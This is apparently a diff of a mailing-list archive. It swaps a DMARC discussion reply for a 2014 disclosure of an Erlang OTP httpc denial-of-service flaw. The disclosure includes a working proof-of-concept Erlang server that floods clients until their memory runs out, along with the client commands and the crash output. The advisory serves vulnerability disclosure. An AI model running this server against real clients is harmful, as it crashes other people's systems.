@@ -1,36 +1,86 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/31/2
-Message-ID: <20140831112429.GW1251@yuggoth.org>
-Date: Sun, 31 Aug 2014 11:24:29 +0000
-From: Jeremy Stanley <fungi@...goth.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Fwd: ezmlm warning
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/02/3
+Message-ID: <CAM4=iJ31bUjj45d6VUy08+NVE-+j0HGP2ZHe9FUOpYfTDdZHsg@mail.gmail.com>
+Date: Fri, 2 May 2014 13:13:12 +0200
+From: Seba <argos83@...il.com>
+To: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Erlang OTP's httpc module Denial of Service
 Content-Type: text/plain; charset=utf-8
 
-On 2014-08-31 01:10:54 +0000 (+0000), Jorge Manuel B. S. Vicetto wrote:
-> I'm forwarding this email to the ml as I just noticed this is the 3rd
-> time since Jun 19th that because of DMARC emails from some members are
-> being rejected by receivers domains, like gmail for me. As I don't
-> recall reading about this topic before in this ml, I'm raising the
-> issue in case others are unaware and start getting warnings for losing
-> emails or are surprised by some members not getting their emails.
-[...]
+Hi,
 
-As someone who helps operate a fairly large listserv myself, this
-has been coming up a lot lately with our subscribers. The official
-recommendations from the DMARC coalition (as far as I've been able
-to tell) are published at http://www.dmarc.org/faq.html#s_3
+  I've reported this issue to erlang-bugs mailing list:
+http://erlang.org/pipermail/erlang-bugs/2014-May/004369.html
 
-The "solution" my fellow sysadmins and I have been leaning toward is
-to unsubscribe and reject subscription requests for any address at
-an obviously DMARC-enforcing domain, and start building a blacklist
-(if someone else already has a DNS-based RBL for this, I'd be quite
-interested to use and possible help maintain it as well). MTA
-operators enforcing DMARC quite obviously wish to go play in their
-own sandbox where a small (statistically, though still quite
-important in my opinion) traditional E-mail use case is simply not
-considered worth supporting. I'm personally perfectly happy if
-nobody at one of those domains ever receives an E-mail message from
-me again.
--- 
-Jeremy Stanley
+Regards,
+
+Sebastián Tello.
+
+
+Using httpc to connect to a malicious server can cause the system to run
+out of memory and crash.
+
+Description
+===========
+
+When requesting a URL from an untrusted source using the httpc OTP module,
+if the server:
+ - accepts the connection
+ - does not read from the socket
+ - and indefinitely writes bytes in the socket.
+
+Then the client will keep on allocating memory until the system crashes.
+
+Proof of concept
+================
+
+Server-side (attacker):
+
+==== PoC module: httpc_dos.erl ====
+-module(httpc_dos).
+
+-export([server/1, server/0]).
+
+server() -> server(5678).
+server(Port)->
+  {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
+                                        {active, false}]),
+  {ok, Sock} = gen_tcp:accept(LSock),
+  socket_write(Sock).
+
+socket_write(Sock) ->
+    ok = gen_tcp:send(Sock, lists:flatten(lists:duplicate(4096, "A"))),
+    socket_write(Sock).
+======== EOF =====
+
+Start the server (use the above module).
+
+1> httpc_dos:server(5678).
+
+
+Client-side (httpc), connect to the server:
+
+$ erl
+Erlang/OTP 17 [erts-6.0] [source] [64-bit] [smp:4:4] [async-threads:10]
+[hipe] [kernel-poll:false]
+
+Eshell V6.0  (abort with ^G)
+1> application:start(inets).
+ok
+2> httpc:request("http://SERVER_IP:5678").
+
+Crash dump was written to: erl_crash.dump
+eheap_alloc: Cannot allocate 1167696400 bytes of memory (of type "heap").
+
+Tested on
+=========
+OTP 17
+Ubuntu 12.04 x86_64
+
+Workaround
+==========
+
+Use lhttpc (https://github.com/esl/lhttpc).I haven't been able to reproduce
+the issue using lhttpc
+as the call will crash when the response size is too large.
+
